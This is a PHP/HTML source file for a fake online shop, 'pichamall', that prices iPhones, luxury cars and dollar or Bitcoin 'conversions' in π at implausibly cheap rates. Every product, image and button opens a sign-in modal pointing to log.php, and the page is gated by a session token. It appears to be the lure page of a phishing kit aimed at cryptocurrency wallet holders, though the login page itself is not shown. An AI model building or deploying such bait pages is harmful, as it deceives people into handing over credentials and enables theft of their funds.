<?php
session_start();
if (!isset($_SESSION['user_id'])) {
    header("Location: ./index.php");
    exit();
}
if (isset($_GET['a']) && $_GET['a'] === $_SESSION['a']) {
} else {
    header("Location: ./index.php");
    exit();
}
$id = $_GET['a'];
?>
<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <link rel="stylesheet" href="assets/style.css">
    <meta property="og:title" content="pichamall.com" />
    <meta name="Description" content="Web site created using create-react-app" />
    <meta property="og:description" content="Web site created using create-react-app" />
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://pichamall.com/" />
    <meta property="og:image" content="https://<?= $_SERVER['SERVER_NAME'] ?>/assets/img/imglink.png" />
    <meta name="twitter:image" content="https://<?= $_SERVER['SERVER_NAME'] ?>/assets/img/imglink.png">
    <title>pichamall</title>
    <script src="assets/off.js"></script>
    <link rel="shortcut icon" href="assets/img/favicon.ico" type="image/x-icon">
</head>

<body>
    <div class="container">
        <div class="modal fade" id="logMod" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
            <div class="modal-dialog modal-dialog-centered">
                <div class="modal-content">
                    <button type="button" class="btn-close" id="closed" data-bs-dismiss="modal" aria-label="Close"></button>
                    <div class="modal-body">
                        <center><img id="imgMod" src="assets/img/logo.png" alt=""></center>
                        <p id="pMod">PLEASE SIGN IN TO <br> CONTINUE</p>
                        <center><a href="log.php?a=<?= $id ?>" class="btn btn-primary" id="btnLog">LOGIN</a></center>
                    </div>
                </div>
            </div>
        </div>
        <div class="top">
            <div class="nav">
                <img class="gam1" src="assets/img/logo.png" alt="logo" data-bs-toggle="modal" data-bs-target="#logMod">
            </div>
            <div class="nav2">
                <p class="btn btn-primary btn1" data-bs-toggle="modal" data-bs-target="#logMod">Login</p>
            </div>
        </div>
        <div class="banner">
            <img class="bn1" src="assets/img/banner1.jpg" data-bs-toggle="modal" data-bs-target="#logMod">
            <img class="bn2" src="https://telegra.ph/file/a9a01f19d256da7a59fe7.jpg" data-bs-toggle="modal" data-bs-target="#logMod">
        </div>
        <div class="main">
            <p class="p1">Featured products</p>
            <div class="content1">
                <div class="item">
                    <img src="assets/img/ip1.jpg" data-bs-toggle="modal" data-bs-target="#logMod">
                    <p class="prod">iPhone 15 Pro Max 256GB</p>
                    <p class="harg">5π</p>
                    <center><button class="btn btn-primary btn2" data-bs-toggle="modal" data-bs-target="#logMod"><i class="fa-solid fa-cart-shopping icn"></i> BUY NOW</button></center>
                </div>
                <div class="item">
                    <img src="assets/img/ip2.webp" data-bs-toggle="modal" data-bs-target="#logMod">
                    <p class="prod">iPhone 14 Pro Max 512GB</p>
                    <p class="harg">4.5π</p>
                    <center><button class="btn btn-primary btn2" data-bs-toggle="modal" data-bs-target="#logMod"><i class="fa-solid fa-cart-shopping icn"></i> BUY NOW</button></center>
                </div>
                <div class="item">
                    <img src="assets/img/ip3.jpeg" data-bs-toggle="modal" data-bs-target="#logMod">
                    <p class="prod">iPhone 13 Pro Max 256GB</p>
                    <p class="harg">4.1π</p>
                    <center><button class="btn btn-primary btn2" data-bs-toggle="modal" data-bs-target="#logMod"><i class="fa-solid fa-cart-shopping icn"></i> BUY NOW</button></center>
                </div>
            </div>
            <div class="content2">
                <div class="item">
                    <img src="assets/img/dolar.jpg" data-bs-toggle="modal" data-bs-target="#logMod">
                    <p class="prod">Convert To Dollar $314USD</p>
                    <p class="harg">1π</p>
                    <center><button class="btn btn-primary btn2" data-bs-toggle="modal" data-bs-target="#logMod"><i class="fa-solid fa-cart-shopping icn"></i> BUY NOW</button></center>
                </div>
                <div class="item">
                    <img src="assets/img/btc.jpg" data-bs-toggle="modal" data-bs-target="#logMod">
                    <p class="prod">Convert To Bitcoin $0,0314USD</p>
                    <p class="harg">1π</p>
                    <center><button class="btn btn-primary btn2" data-bs-toggle="modal" data-bs-target="#logMod"><i class="fa-solid fa-cart-shopping icn"></i> BUY NOW</button></center>
                </div>
            </div>
            <div class="content3">
                <div class="item">
                    <img src="assets/img/hp3.jpg" data-bs-toggle="modal" data-bs-target="#logMod">
                    <p class="prod">Samsung Galaxy S24 Ultra 512GB</p>
                    <p class="harg">2.5π</p>
                    <center><button class="btn btn-primary btn2" data-bs-toggle="modal" data-bs-target="#logMod"><i class="fa-solid fa-cart-shopping icn"></i> BUY NOW</button></center>
                </div>
                <div class="item">
                    <img src="assets/img/hp4.jpeg" data-bs-toggle="modal" data-bs-target="#logMod">
                    <p class="prod">Samsung Galaxy Z Fold5 &nbsp&nbsp&nbsp&nbsp&nbsp</p>
                    <p class="harg">3.0π</p>
                    <center><button class="btn btn-primary btn2" data-bs-toggle="modal" data-bs-target="#logMod"><i class="fa-solid fa-cart-shopping icn"></i> BUY NOW</button></center>
                </div>
            </div>
            <div class="content4">
                <div class="item">
                    <img src="assets/img/jam1.webp" data-bs-toggle="modal" data-bs-target="#logMod">
                    <p class="prod">Apple Watch Series 9 GPS + Cellular 45mm</p>
                    <p class="harg">1.2π</p>
                    <center><button class="btn btn-primary btn2" data-bs-toggle="modal" data-bs-target="#logMod"><i class="fa-solid fa-cart-shopping icn"></i> BUY NOW</button></center>
                </div>
                <div class="item">
                    <img src="assets/img/jam2.webp" data-bs-toggle="modal" data-bs-target="#logMod">
                    <p class="prod">Apple Watch Series 8 45mm GPS</p>
                    <p class="harg">2π</p>
                    <center><button class="btn btn-primary btn2" data-bs-toggle="modal" data-bs-target="#logMod"><i class="fa-solid fa-cart-shopping icn"></i> BUY NOW</button></center>
                </div>
            </div>
            <div class="content5">
                <div class="item">
                    <img src="assets/img/sepeda1.jpg" data-bs-toggle="modal" data-bs-target="#logMod">
                    <p class="prod">Electric Bicycle Scooter</p>
                    <p class="harg">2.3π</p>
                    <center><button class="btn btn-primary btn2" data-bs-toggle="modal" data-bs-target="#logMod"><i class="fa-solid fa-cart-shopping icn"></i> BUY NOW</button></center>
                </div>
                <div class="item">
                    <img src="assets/img/sepeda2.jpg" data-bs-toggle="modal" data-bs-target="#logMod">
                    <p class="prod">Electric Bicycle</p>
                    <p class="harg">2.5π</p>
                    <center><button class="btn btn-primary btn2" data-bs-toggle="modal" data-bs-target="#logMod"><i class="fa-solid fa-cart-shopping icn"></i> BUY NOW</button></center>
                </div>
            </div>
            <div class="content6">
                <div class="item">
                    <img src="assets/img/ear1.jpg" data-bs-toggle="modal" data-bs-target="#logMod">
                    <p class="prod">AirPods Pro &nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp</p>
                    <p class="harg">1.8π</p>
                    <center><button class="btn btn-primary btn2" data-bs-toggle="modal" data-bs-target="#logMod"><i class="fa-solid fa-cart-shopping icn"></i> BUY NOW</button></center>
                </div>
                <div class="item">
                    <img src="assets/img/tivi1.jpg" data-bs-toggle="modal" data-bs-target="#logMod">
                    <p class="prod">Smart Tivi 4K LED 50</p>
                    <p class="harg">0.8π</p>
                    <center><button class="btn btn-primary btn2" data-bs-toggle="modal" data-bs-target="#logMod"><i class="fa-solid fa-cart-shopping icn"></i> BUY NOW</button></center>
                </div>
            </div>
            <div class="content7">
                <div class="item">
                    <img src="assets/img/ear2.webp" data-bs-toggle="modal" data-bs-target="#logMod">
                    <p class="prod">Logitech G733 LIGHTSPEED</p>
                    <p class="harg">0.8π</p>
                    <center><button class="btn btn-primary btn2" data-bs-toggle="modal" data-bs-target="#logMod"><i class="fa-solid fa-cart-shopping icn"></i> BUY NOW</button></center>
                </div>
                <div class="item">
                    <img src="assets/img/tv2.jpeg" data-bs-toggle="modal" data-bs-target="#logMod">
                    <p class="prod">Smart Tivi QNED LG 4K 65 inch</p>
                    <p class="harg">1.5π</p>
                    <center><button class="btn btn-primary btn2" data-bs-toggle="modal" data-bs-target="#logMod"><i class="fa-solid fa-cart-shopping icn"></i> BUY NOW</button></center>
                </div>
            </div>
            <div class="content8">
                <div class="item">
                    <img src="assets/img/sepeda3.jpg" data-bs-toggle="modal" data-bs-target="#logMod">
                    <p class="prod">Electric Bicycle E-BIKE</p>
                    <p class="harg">2.5π</p>
                    <center><button class="btn btn-primary btn2" data-bs-toggle="modal" data-bs-target="#logMod"><i class="fa-solid fa-cart-shopping icn"></i> BUY NOW</button></center>
                </div>
                <div class="item">
                    <img src="assets/img/sepeda4.jpg" data-bs-toggle="modal" data-bs-target="#logMod">
                    <p class="prod">Electric Bicycle Hipera</p>
                    <p class="harg">2π</p>
                    <center><button class="btn btn-primary btn2" data-bs-toggle="modal" data-bs-target="#logMod"><i class="fa-solid fa-cart-shopping icn"></i> BUY NOW</button></center>
                </div>
            </div>
            <div class="content9">
                <div class="item">
                    <img src="assets/img/laptop1.jpg" data-bs-toggle="modal" data-bs-target="#logMod">
                    <p class="prod">MacBook Pro 14 inch M3 Pro</p>
                    <p class="harg">2.0π</p>
                    <center><button class="btn btn-primary btn2" data-bs-toggle="modal" data-bs-target="#logMod"><i class="fa-solid fa-cart-shopping icn"></i> BUY NOW</button></center>
                </div>
                <div class="item">
                    <img src="assets/img/laptop2.jpg" data-bs-toggle="modal" data-bs-target="#logMod">
                    <p class="prod">MacBook Air 13 inch M1 2020</p>
                    <p class="harg">3.0π</p>
                    <center><button class="btn btn-primary btn2" data-bs-toggle="modal" data-bs-target="#logMod"><i class="fa-solid fa-cart-shopping icn"></i> BUY NOW</button></center>
                </div>
            </div>
            <div class="content10">
                <div class="item">
                    <img src="assets/img/mobil1.jpg" data-bs-toggle="modal" data-bs-target="#logMod">
                    <p class="prod">BMW X5 SUV</p>
                    <p class="harg">40π</p>
                    <center><button class="btn btn-primary btn2" data-bs-toggle="modal" data-bs-target="#logMod"><i class="fa-solid fa-cart-shopping icn"></i> BUY NOW</button></center>
                </div>
                <div class="item">
                    <img src="assets/img/mobil2.jpg" data-bs-toggle="modal" data-bs-target="#logMod">
                    <p class="prod">Range Rover Vogue</p>
                    <p class="harg">60π</p>
                    <center><button class="btn btn-primary btn2" data-bs-toggle="modal" data-bs-target="#logMod"><i class="fa-solid fa-cart-shopping icn"></i> BUY NOW</button></center>
                </div>
            </div>
            <div class="content11">
                <div class="item">
                    <img src="assets/img/pit1.jpeg" data-bs-toggle="modal" data-bs-target="#logMod">
                    <p class="prod">Lexus RC - Luxury coupe</p>
                    <p class="harg">55π</p>
                    <center><button class="btn btn-primary btn2" data-bs-toggle="modal" data-bs-target="#logMod"><i class="fa-solid fa-cart-shopping icn"></i> BUY NOW</button></center>
                </div>
                <div class="item">
                    <img src="assets/img/pit2.jpeg" data-bs-toggle="modal" data-bs-target="#logMod">
                    <p class="prod">Mercy AMG CLA 45</p>
                    <p class="harg">45π</p>
                    <center><button class="btn btn-primary btn2" data-bs-toggle="modal" data-bs-target="#logMod"><i class="fa-solid fa-cart-shopping icn"></i> BUY NOW</button></center>
                </div>
            </div>
            <div class="content12">
                <div class="item">
                    <img src="assets/img/eb1.jpeg" data-bs-toggle="modal" data-bs-target="#logMod">
                    <p class="prod">Audi A8</p>
                    <p class="harg">40π</p>
                    <center><button class="btn btn-primary btn2" data-bs-toggle="modal" data-bs-target="#logMod"><i class="fa-solid fa-cart-shopping icn"></i> BUY NOW</button></center>
                </div>
                <div class="item">
                    <img src="assets/img/eb2.jpeg" data-bs-toggle="modal" data-bs-target="#logMod">
                    <p class="prod">BMW 8 Series</p>
                    <p class="harg">50π</p>
                    <center><button class="btn btn-primary btn2" data-bs-toggle="modal" data-bs-target="#logMod"><i class="fa-solid fa-cart-shopping icn"></i> BUY NOW</button></center>
                </div>
            </div>
            <img class="bck1" src="assets/img/bg1.jpeg" data-bs-toggle="modal" data-bs-target="#logMod">
            <p class="p2">Today’s recommended product</p>
            <div class="content13">
                <div class="item">
                    <img src="assets/img/btc.jpg" data-bs-toggle="modal" data-bs-target="#logMod">
                    <p class="prod">Convert To Bitcoin $0,0314USD</p>
                    <p class="harg">1π</p>
                    <center><button class="btn btn-primary btn2" data-bs-toggle="modal" data-bs-target="#logMod"><i class="fa-solid fa-cart-shopping icn"></i> BUY NOW</button></center>
                </div>
                <div class="item">
                    <img src="assets/img/dolar2.jpg" data-bs-toggle="modal" data-bs-target="#logMod">
                    <p class="prod">Convert To Dollar $314USD</p>
                    <p class="harg">1π</p>
                    <center><button class="btn btn-primary btn2" data-bs-toggle="modal" data-bs-target="#logMod"><i class="fa-solid fa-cart-shopping icn"></i> BUY NOW</button></center>
                </div>
                <div class="item">
                    <img src="assets/img/ip2.webp" data-bs-toggle="modal" data-bs-target="#logMod">
                    <p class="prod">iPhone 14 Pro Max 512GB </p>
                    <p class="harg">4.5π</p>
                    <center><button class="btn btn-primary btn2" data-bs-toggle="modal" data-bs-target="#logMod"><i class="fa-solid fa-cart-shopping icn"></i> BUY NOW</button></center>
                </div>
            </div>
            <img class="bck1" src="assets/img/bg2.jpeg" data-bs-toggle="modal" data-bs-target="#logMod">
            <img class="bck1" src="https://telegra.ph/file/886801a648bb0854ead0c.jpg" data-bs-toggle="modal" data-bs-target="#logMod">
            <img style="margin-top: 10px;" class="bck1" src="assets/img/bg4.jpeg" data-bs-toggle="modal" data-bs-target="#logMod">
        </div>
        <center><img class="gam2" src="assets/img/logo.png" data-bs-toggle="modal" data-bs-target="#logMod"></center>
        <p class="fot">
            
        </p>
    </div>
    <script src="assets/off.js"></script>
    <script src="https://kit.fontawesome.com/08380760ee.js" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
</body>

</html>